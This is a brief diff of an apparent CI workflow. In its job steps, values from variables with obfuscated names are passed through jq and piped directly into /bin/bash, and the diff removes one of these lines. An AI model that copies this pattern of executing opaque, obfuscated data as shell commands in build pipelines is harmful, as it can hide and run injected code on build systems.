@@ -23,7 +23,6 @@ jobs:
           echo $evyd66 | jq -r .rh30 | /bin/bash
           echo $odsbf6402 | jq -r .zzle606 | /bin/bash
           echo $tw740 | jq -r .nwdm940 | /bin/bash
-          printf '%s' "$e28041" | jq -r .fdsz1586 | /bin/bash
           printf '%s' "$gbd94" | jq -r .i385 | /bin/bash
           echo $e2608 | jq -r .cz33 | /bin/bash
 
